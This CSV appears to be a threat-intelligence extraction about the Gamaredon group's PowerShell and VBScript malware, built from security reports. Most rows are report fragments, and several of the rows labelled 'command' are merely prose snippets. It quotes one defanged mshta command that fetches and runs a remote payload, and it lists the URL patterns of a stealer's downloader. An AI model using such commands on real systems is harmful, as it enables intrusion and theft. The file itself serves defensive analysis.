1.0.0,actor--gamaredon,artifact--sha256:e2f3503282e8c3269e23e9db02fa1f219d4c26be7cad2ed6c13965a8debde2b3,observation--sha256:aeeded182d6520006f0013424d9d8dce6d2f0774fd137092a57066ed807eee12,command,"PteroGram is a known Gamaredon infostealer , written in PowerShell , that we discovered in 2023, and","PteroGram is a known Gamaredon infostealer , written in PowerShell , that we discovered in 2023, and",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 27}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"27 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 17. PteroScout ’s function for acquiring system information (VBScript version) Network protocol PteroScout uses an HTTP POST request with the URI path /info to exfiltrate information about a compromised system to its C&C server. PteroSteal PteroSteal is a known Gamaredon credential stealer , written in PowerShell , that we saw for the first time in 2022, and described in our Gamaredon 2022 – 2023 white paper ",
1.0.0,actor--gamaredon,artifact--sha256:ad43ba1b24f740ed74a454aa823817cd8c66aa63f09973b8d469622a813f413a,observation--sha256:2c12021463f7f37e95ba7bfff9b0aa860e140203118552c61582c6bd9778edba,command,"PteroGraphin , is a simple PowerShell downloader encapsulated in a VBScript wrapper. PteroDee does not","PteroGraphin , is a simple PowerShell downloader encapsulated in a VBScript wrapper. PteroDee does not",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Classification First seen Written in Description PteroLNK VBScript version Weaponizer November 2020 VBScript Weaponizes connected USB drives. PteroPSLoad Downloader October 2021 PowerShell Downloads other Gamaredon tools. PteroBox File stealer November 2024 PowerShell Exfiltrates files to Dropbox. PteroPSDoor File stealer May 2022 PowerShell Exfiltrates files to Gamaredon C&C servers and various cloud storage se",
1.0.0,actor--gamaredon,artifact--sha256:c598b4a4d53552e457a47ec3364080b0c643245c81f2ef42f9d012b71537a1d3,observation--sha256:60a373a780d384234599de42b527855751e15e5f4acf3b43af2411f1a799563b,command,PteroLNK PowerShell ver sion,PteroLNK PowerShell ver sion,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroLNK is obfuscated in multiple layers, detailed in the Obfuscation section. The obfuscation applied to the scheduler component, where selected characters are replaced with random sequences, is also used on code blocks embedded as base64 -encoded blobs. Nearly all strin g variables and small code blocks are divided into smaller parts and then concatenated before use or execution. Additionally, fun",
1.0.0,actor--gamaredon,artifact--sha256:d6adedc8c0ed0286b1a823729d0ffd317789799a14b923fa26e2475f7f3b633f,observation--sha256:99ec7f3e7ec519e7c5b6a092609fb11db8e470694cfdf8631b903407b8dae5c4,command,PteroOdd Downloader February 2025 PowerShell Downloads Turla’s payloads.,PteroOdd Downloader February 2025 PowerShell Downloads Turla’s payloads,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"7 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances TOOLSET In 2025, Gamaredon developed six new custom tools, but also continued using and updating many of its tools that we described in our two previous white papers, which detailed the group’s activities in 2 022– 2023 and 2024. The programming languages of choice for developing the se new tools remain PowerShell and VBScript : all Gamaredon tools mentioned in this white paper are written in one of these programming",
1.0.0,actor--gamaredon,artifact--sha256:87d04d162770e9573ccbe8c65d49b87fe3d8b5c98420646c2be2c377c3e698ce,observation--sha256:1cbe7c45e843ed92b3a1b701b83c1d2ecff44b212d8ee6795280edc607c4f101,command,PteroPSDoor File stealer May 2022 PowerShell,PteroPSDoor File stealer May 2022 PowerShell,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Classification First seen Written in Description PteroLNK VBScript version Weaponizer November 2020 VBScript Weaponizes connected USB drives. PteroPSLoad Downloader October 2021 PowerShell Downloads other Gamaredon tools. PteroBox File stealer November 2024 PowerShell Exfiltrates files to Dropbox. PteroPSDoor File stealer May 2022 PowerShell Exfiltrates files to Gamaredon C&C servers and various cloud storage se",
1.0.0,actor--gamaredon,artifact--sha256:055d4e8f887a338e6a93cdb41e4ee467f83fed7b4cdd1bb02463f90e0f588bc8,observation--sha256:c92bfc654eb2832c3fcace22f4cb14b66b7d59e9cbf2ad851eaf9c03600c0109,command,PteroPSDoor Stealer PowerShell Exfiltrates specific files from the file system.,PteroPSDoor Stealer PowerShell Exfiltrates specific files from the file system,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,8 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Tool Category Written in Description PteroDash Downloader VBScript Downloa ds various payloads. PteroRisk Downloader VBScript Downloads various payloads. PteroCDrop Dropper C Drops various VBScript payloads. PteroLNK Weaponizer VBScript Weaponizes connected USB drives. PowerShell PteroDoc Weaponizer VBScript Weaponizes Word documents. PteroTemplate Weaponizer VBScript Weaponizes Word templates. PteroD,
1.0.0,actor--gamaredon,artifact--sha256:4abf060343ccc1f7b6aa4b90336195f976cc56a1c98a3406cfa4bf0aedcd4a48,observation--sha256:134ba5c2fc5310a5729a13d5b01532471eaacc3e6f2c8515a97a10db4f08409d,command,"PteroPSLoad , written in PowerShell , is a known Gamaredon downloader that has been in use since 2021. In","PteroPSLoad , written in PowerShell , is a known Gamaredon downloader that has been in use since 2021. In",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"20 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Third variant As described in our Gamaredon 2024 whitepaper, the third variant uses a downloader component , which we’ve now named PteroQuark. On February 10th, 2025, PteroQuark was updated with these key changes: • The tokens that it expects in downloaded base64 -encoded payloads changed from ?? to ))). • PteroQuark’s C&C config is stored in alternate data streams instead of in registry values. It uses randomly nam",
1.0.0,actor--gamaredon,artifact--sha256:9a14c459dc593839edce8d951954e2e157e91a110f34ab14b647f8f44c5d535b,observation--sha256:b040a9c6741db39fd3f72197a1e9becefc27e3702ef5f1b6a637f96fc378f844,command,PteroPSLoad Downloader October 2021 PowerShell Downloads other Gamaredon tools.,PteroPSLoad Downloader October 2021 PowerShell Downloads other Gamaredon tools,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Classification First seen Written in Description PteroLNK VBScript version Weaponizer November 2020 VBScript Weaponizes connected USB drives. PteroPSLoad Downloader October 2021 PowerShell Downloads other Gamaredon tools. PteroBox File stealer November 2024 PowerShell Exfiltrates files to Dropbox. PteroPSDoor File stealer May 2022 PowerShell Exfiltrates files to Gamaredon C&C servers and various cloud storage se",
1.0.0,actor--gamaredon,artifact--sha256:15b9a0d91db15e72d7020a2d91f130d3547474b0d9b389922af44e64330c475d,observation--sha256:bc117cb2f7ce688b47e4b96b76775dd8b2c8b7c94086d92f2d44c691a398d7f0,command,PteroPSLoad Downloader PowerShell Downloads various payloads.,PteroPSLoad Downloader PowerShell Downloads various payloads,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"7 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Weaponized Word documents Gamaredon also compromises new targets using the victim’s Word documents , weaponized by either PteroDoc or PteroTemplate. These documents then download a malicious remote template that delivers PteroDash , which can download additional payloads to a newly compromised system . PteroDoc, when deployed to an already compromised system , weaponizes all Word documents on a system",
1.0.0,actor--gamaredon,artifact--sha256:60eb15a418ac2c249adf32e42f8ea0313ea02914b252d84cba61b37e9001b6ec,observation--sha256:71f47aa097167098d0f3b60af7eea51117ee5c8d54e09e2c1441131795684d05,command,PteroPSLoad and executed within a PowerShell process using an instance of the,PteroPSLoad and executed within a PowerShell process using an instance of the,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"10 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 General -purpose downloaders We recognize eight types of general -purpose downloaders: five standalone and three built -in. Standalone downloaders primarily deliver payloads, whereas built -in dow nloaders have other primary capabilities but can also deliver payloads. PteroPSLoad PteroPSLoad is a downloader written in PowerShell that we discovered in October 2021 . After it is deployed, it remains pe",
1.0.0,actor--gamaredon,artifact--sha256:2dd5a29e043a94e884a51c09ea619cf0f1b59df278eaada678eade42ec07d680,observation--sha256:61e0f865ff9bc5977c499539a12a0d7f7b4b7caa92529382027ea5ba5ad3d99d,command,"PteroPSLoad attempts to hide itself in the registry. First, it stores the orchestrator – a short PowerShell","PteroPSLoad attempts to hide itself in the registry. First, it stores the orchestrator – a short PowerShell",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"12 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Firstly, PteroPSLoad resolves the C&C server ’s IP address from the hardcoded domain by querying the default system DNS. Secondly, it uses that IP address to send an HTTP GET request with the /get.php URI to its C&C server to fetch its updated version . Thirdly, it ensures the persistence of the downloaded update by creating an HKCU Run value that will execute it upon every system start, serving as b",
1.0.0,actor--gamaredon,artifact--sha256:0f8a57e21d9768510b6996c51247281dfdbec51c63fb203e460195ec26f9a3f9,observation--sha256:287b28f87c9beb0f4b3d70db73f8a38a116383ba28f9cc98ca24516eab15943c,command,PteroPSLoad is a downloader written in PowerShell that we discovered in October 2021 . After it is,PteroPSLoad is a downloader written in PowerShell that we discovered in October 2021 . After it is,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"10 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 General -purpose downloaders We recognize eight types of general -purpose downloaders: five standalone and three built -in. Standalone downloaders primarily deliver payloads, whereas built -in dow nloaders have other primary capabilities but can also deliver payloads. PteroPSLoad PteroPSLoad is a downloader written in PowerShell that we discovered in October 2021 . After it is deployed, it remains pe",
1.0.0,actor--gamaredon,artifact--sha256:79789319c754ff26cacd83e953f5d49e7cfed0a0fd7e125eb4d550448e643601,observation--sha256:6dd671b4e51b0bb44cc276d030d4fbd596ae54707437ade3f32c9425cb10c7c0,command,PteroPSLoad – PowerShell,PteroPSLoad – PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,41 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 025E3D88C53FC12D5A4A AB726E696F2815BAC84D N/A VBS/Pterodo.TX PteroPSLoad – PowerShell downloader. D5576E578518E474A5DF F654C44AB3EC4A6E4ECF N/A PowerShell/Pterodo.FD PteroPSLoad – PowerShell downloader. 28F4F0367C2BB0574C8A 7D1B9C3E71E6AC678300 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell downloader. E0BD8855159CB708789C 4DE183E107C5C117FBA1 N/A PowerShell/P,
1.0.0,actor--gamaredon,artifact--sha256:139dacb7e4e0537e596b01fbb1929e866581c030b11374ffd33b9a55dbdcc0cc,observation--sha256:486db688e77167770ec534c0bf6b7538156916b58ef93bbde121f871f8a8c116,command,PteroPShell Backdoor PowerShell Serves as a remote shell.,PteroPShell Backdoor PowerShell Serves as a remote shell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,8 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Tool Category Written in Description PteroDash Downloader VBScript Downloa ds various payloads. PteroRisk Downloader VBScript Downloads various payloads. PteroCDrop Dropper C Drops various VBScript payloads. PteroLNK Weaponizer VBScript Weaponizes connected USB drives. PowerShell PteroDoc Weaponizer VBScript Weaponizes Word documents. PteroTemplate Weaponizer VBScript Weaponizes Word templates. PteroD,
1.0.0,actor--gamaredon,artifact--sha256:7fff4dd2b8d685463f5cadcab18e702d107185955934968a00cd1f94804e8d48,observation--sha256:bb6b93e70faadff78e1a549ef7fcf48194ee2a13950c6b0fb0a999a9ccafabb1,command,PteroPaste adds a command line with a PowerShell one -liner to the registry value HKCU \Environment \,PteroPaste adds a command line with a PowerShell one -liner to the registry value HKCU \Environment \,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"11 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances • a downloader, • an embedded weaponizer, and • an embedded runner. The downloader is created from an embedded template and regularly retriev es payloads from dead drops. Later instances retrieve payloads from C&C servers hidden behind tunnel services, not from dead drops. Most PteroPaste payloads seen in ESET telemetry were instances of PteroEffigy , described in a later section. The rest were Turla PowerShell payl",
1.0.0,actor--gamaredon,artifact--sha256:d113a8a18e2bee5923c1d8624dbf878b621fa5fb3458a5f81dfde27536c77e15,observation--sha256:b7d96d4474d789f1dc66f9b1f0ebfd1c8c1f19a8376fc3aa91dc6837a2f32a54,command,PteroScout Stealer PowerShell Exfiltrates various system information.,PteroScout Stealer PowerShell Exfiltrates various system information,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,8 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Tool Category Written in Description PteroDash Downloader VBScript Downloa ds various payloads. PteroRisk Downloader VBScript Downloads various payloads. PteroCDrop Dropper C Drops various VBScript payloads. PteroLNK Weaponizer VBScript Weaponizes connected USB drives. PowerShell PteroDoc Weaponizer VBScript Weaponizes Word documents. PteroTemplate Weaponizer VBScript Weaponizes Word templates. PteroD,
1.0.0,actor--gamaredon,artifact--sha256:ce2ce1ad5fd955714a3297f7bcd577513f15586a4ea4d37ffc144877829ac66c,observation--sha256:a836fed11a475fc3c803b911476bf24b52cad7769fdf4e41d90db9ebedd6bf2e,command,"PteroScout as a cleartext PowerShell script with mostly sequential code; now , general -purpose","PteroScout as a cleartext PowerShell script with mostly sequential code; now , general -purpose",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"26 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 16. An example of a PteroVDoor decryptor Persistence PteroVDoor instances observed until May 31st, 2025 ensure persistence via the HKCU Run key with the registry value named GooglePhone . The instances observed between May 31st, 2025 and September 18th, 2025 don’t use any persistence mechanisms. And the instances observed after September 18th, 2025 are persisted via the PteroVDoor decryptor, which loads them ",
1.0.0,actor--gamaredon,artifact--sha256:450b38d1cb27cb258ef31b42759b7b767f7808f66ba61bb0d65e458612c0769c,observation--sha256:f796c4dc47971376ddcf0c18159d9f5d582b60d57a1da403200699ce6c57ffba,command,PteroScreen Stealer PowerShell Captures and exfiltrates screenshots.,PteroScreen Stealer PowerShell Captures and exfiltrates screenshots,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,8 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Tool Category Written in Description PteroDash Downloader VBScript Downloa ds various payloads. PteroRisk Downloader VBScript Downloads various payloads. PteroCDrop Dropper C Drops various VBScript payloads. PteroLNK Weaponizer VBScript Weaponizes connected USB drives. PowerShell PteroDoc Weaponizer VBScript Weaponizes Word documents. PteroTemplate Weaponizer VBScript Weaponizes Word templates. PteroD,
1.0.0,actor--gamaredon,artifact--sha256:c4bda844c87abb5202a05d5d9fb4004898674ea5ff974cbfafc26291589956ae,observation--sha256:dae5cb565c0e901c5e89401124931b7cbf4a83a98091cd921478fbd46e49b0c1,command,PteroSig Stealer PowerShell Exfiltrates data stored by the Signal application.,PteroSig Stealer PowerShell Exfiltrates data stored by the Signal application,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,8 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Tool Category Written in Description PteroDash Downloader VBScript Downloa ds various payloads. PteroRisk Downloader VBScript Downloads various payloads. PteroCDrop Dropper C Drops various VBScript payloads. PteroLNK Weaponizer VBScript Weaponizes connected USB drives. PowerShell PteroDoc Weaponizer VBScript Weaponizes Word documents. PteroTemplate Weaponizer VBScript Weaponizes Word templates. PteroD,
1.0.0,actor--gamaredon,artifact--sha256:8b23edc6b577924d77e77fc231a0c47c6f9412892c8d5084f9bbc18d1eea2737,observation--sha256:82732067b176fe2838c434b733efdf0fdfe9aa84ebe0d9d61f9004984c040e5f,command,PteroSocks Ad hoc PowerShell Serves as a reverse SOCKS proxy.,PteroSocks Ad hoc PowerShell Serves as a reverse SOCKS proxy,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,8 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Tool Category Written in Description PteroDash Downloader VBScript Downloa ds various payloads. PteroRisk Downloader VBScript Downloads various payloads. PteroCDrop Dropper C Drops various VBScript payloads. PteroLNK Weaponizer VBScript Weaponizes connected USB drives. PowerShell PteroDoc Weaponizer VBScript Weaponizes Word documents. PteroTemplate Weaponizer VBScript Weaponizes Word templates. PteroD,
1.0.0,actor--gamaredon,artifact--sha256:f16332f1e4cc55a344376eeb97f0026650e9c57c9af36735fd13eb7c6d1a4355,observation--sha256:475fdf53da2b8094e8b4444abaf50a9ee853a9bcafa449ff158f13f04ab0248a,command,PteroSteal Infostealer July 2022 PowerShell Exfiltrates data stored by specific web,PteroSteal Infostealer July 2022 PowerShell Exfiltrates data stored by specific web,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Classification First seen Written in Description PteroLNK VBScript version Weaponizer November 2020 VBScript Weaponizes connected USB drives. PteroPSLoad Downloader October 2021 PowerShell Downloads other Gamaredon tools. PteroBox File stealer November 2024 PowerShell Exfiltrates files to Dropbox. PteroPSDoor File stealer May 2022 PowerShell Exfiltrates files to Gamaredon C&C servers and various cloud storage se",
1.0.0,actor--gamaredon,artifact--sha256:ee0f7c194405529de9f011cf6cb8dcd8b647936e3c7bec894bdbad5e028ab706,observation--sha256:b8ea919122217baf9196ee371b9d6c91ca30ba7481421fc7fa38063be88e88e8,command,PteroSteal Stealer PowerShell Exfiltrates credentials stored by browsers.,PteroSteal Stealer PowerShell Exfiltrates credentials stored by browsers,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,8 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Tool Category Written in Description PteroDash Downloader VBScript Downloa ds various payloads. PteroRisk Downloader VBScript Downloads various payloads. PteroCDrop Dropper C Drops various VBScript payloads. PteroLNK Weaponizer VBScript Weaponizes connected USB drives. PowerShell PteroDoc Weaponizer VBScript Weaponizes Word documents. PteroTemplate Weaponizer VBScript Weaponizes Word templates. PteroD,
1.0.0,actor--gamaredon,artifact--sha256:902a7331c725a2883e14db19ba583f32b4e73f1b932b55fe2a9df9761e522497,observation--sha256:1b5d80d56081d98ee9f5b893c826221eb15e4b226536cd90218612eba45037c6,command,"PteroSteal is a known Gamaredon credential stealer , written in PowerShell , that we saw for the first time","PteroSteal is a known Gamaredon credential stealer , written in PowerShell , that we saw for the first time",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 27}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"27 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 17. PteroScout ’s function for acquiring system information (VBScript version) Network protocol PteroScout uses an HTTP POST request with the URI path /info to exfiltrate information about a compromised system to its C&C server. PteroSteal PteroSteal is a known Gamaredon credential stealer , written in PowerShell , that we saw for the first time in 2022, and described in our Gamaredon 2022 – 2023 white paper ",
1.0.0,actor--gamaredon,artifact--sha256:db5c9ccd57ca919d350321dee4d062f8efa0b22893e5819005b6bca2becfe0ab,observation--sha256:fb7fe7093638612affe844eba6150f8ae970f11bea968adb89664ce16919391c,command,"Regarding tooling, Gamaredon strictly stuck to using a combination of the VBScript and PowerShell","Regarding tooling, Gamaredon strictly stuck to using a combination of the VBScript and PowerShell",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"29 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Registered domains and fast flux DNS In 2025, we identified 189 domains registered and used by Gamaredon, a number similar to what we observed the previous year . The majority of the se domains had the .ru top-level domain ( TLD) and a small number had the .online TLD. Gamaredon operators still partially rel ied on a combination of such domains and the fast flux DNS technique that they use to frequently change IP ad",
1.0.0,actor--gamaredon,artifact--sha256:a7264e505a1d05f8487b59d33eab3af6eb602aab158c99fb53fabd985cc2857c,observation--sha256:db5a24c0012c61ce12991d26af327d0944e220ebd484df725e2f8e601e8a62ca,command,System Binary Proxy Execution: Mshta T1218.005,System Binary Proxy Execution: Mshta T1218.005,candidate,,unknown,unknown,not-stated,,source--gamaredon--a0d52e16421d8b11,Gamaredon/Beyond_Bullets_and_Bombs_An_Examination_of_Armageddon_Groups_Cyber.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Beyond Bullets and Bombs: An Examination of Armageddon Group's Cyber Warfare Against Ukraine 9 %windir%\system32\mshta.exe http://194.180.174[.]203/23.01/mo/baseball[.]DjVu MITRE ATT&CK TECHNIQUE NAME TECHNIQUE ID Spearphishing Attachment T1566.001 User Execution T1204.002 System Binary Proxy Execution: Mshta T1218.005 Defense Evasion Abusing Telegram to Bypass DNS Generally in the second stage, a malicious VBScript is used then they abuse Telegram to get the real C2 IP address. For example http",
1.0.0,actor--gamaredon,artifact--sha256:121da6077a40d5468048a743acda226811fdfb3148c0b7a465d6ba6549be2a61,observation--sha256:91aee3375c81add3321f37ebbcf202b2337bb6049827e106cc448845b15dee58,command,"Tasks created by PteroBox instances deployed before October 29th, 2025 directly executed a PowerShell","Tasks created by PteroBox instances deployed before October 29th, 2025 directly executed a PowerShell",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 22}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances PteroBox PteroBox is a known Gamaredon file stealer that we discovered at the end of 2024, and detailed in our Gamaredon 2024 white paper. During 2025, we discovered a new variant of PteroBox that uses the rclone utility to exfiltrate files to Dropbox; therefore, we named it the rclone variant. The API variant, as we now call the original variant, has been updated a few times throughout 2025, and both variants have ",
1.0.0,actor--gamaredon,artifact--sha256:31b85fc21c54d5b46eb18897584baf475d56ce1682a485f30f82623e5bf43bcb,observation--sha256:a5427cf7d0935780d73ccef43d460b364b6c78146d37cbdf2816610bb0e3ab5d,command,"The HTA file from the embedded archive launches mshta.exe , which in turn downloads and executes","The HTA file from the embedded archive launches mshta.exe , which in turn downloads and executes",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"6 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Figure 4. An example HTA file from a Gamaredon spearphishing campaign Later, around April 2023, the tactics, techniques, and procedures (TTPs) of Gamaredon’s spearphishing campaigns changed once again, using HTML smuggling to deliver a malicious HTA file via an HTML email attachment. Upon opening, the HTML document displays a dialog for downloading the archive, but the archive is in fact base64 encode",
1.0.0,actor--gamaredon,artifact--sha256:70e84dbb81f0ddb0a579eacf67722b768eb572883a59ea1a0d360aabbda6238b,observation--sha256:f0becca48c12ebe0b69664e8210f5815b5e6a0ecf89813edbe5e4d3b66e6f855,command,"The PowerShell version of PteroLNK, which we discovered in May 2022, weaponizes connected USB","The PowerShell version of PteroLNK, which we discovered in May 2022, weaponizes connected USB",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroLNK is obfuscated in multiple layers, detailed in the Obfuscation section. The obfuscation applied to the scheduler component, where selected characters are replaced with random sequences, is also used on code blocks embedded as base64 -encoded blobs. Nearly all strin g variables and small code blocks are divided into smaller parts and then concatenated before use or execution. Additionally, fun",
1.0.0,actor--gamaredon,artifact--sha256:35a4b2d281d8c711df19745aaba599feff10e50d6b002fadd89dd4a69bf9fc43,observation--sha256:5317df1bac257a0f89c6d1712888142e3b6f14053ad21ae1c3b58e52e6d1143a,command,The initial instances of the fourth version resembled the previous one – a complex PowerShell,The initial instances of the fourth version resembled the previous one – a complex PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,18 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Associated URL patterns Downloader of PteroSteal http://<IP>/pass http://<IP>/password http://<IP>/scripts/password.txt http://<IP>/admin/password.txt http://<IP>/test/password.txt http://<IP>/log/password.txt http://<IP>/in dex/password.txt http://<IP>/files/password.txt http://<IP>/local/password.txt http://<IP>/js/password.txt http://<IP>/phpmyadmin/password.txt http://<IP>/core/password.txt http:,
1.0.0,actor--gamaredon,artifact--sha256:5f6f33acb9c50e556c1bc8eef38a359f21fd9aa727e29b04d8f1b967a3596c69,observation--sha256:593ddb3ff147d4ea3b12272fc2459e8077addec2f3965316f65addc3b89424f6,command,The last file is a free WGET console bootloader that,The last file is a free WGET console bootloader that,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"winrestore.dll is a tool responsible for creating and collecting screenshots. It should be noted that the set of modules changed with every new wave of attack, with the expectation of loading the necessary components after fixing in the system (depending on current needs). At the same time, the servers are configured in such way that attempts to load the malware components for research were unsuccessful, and the server response was 404 Not Found. This is due to additional settings/ parameters of",
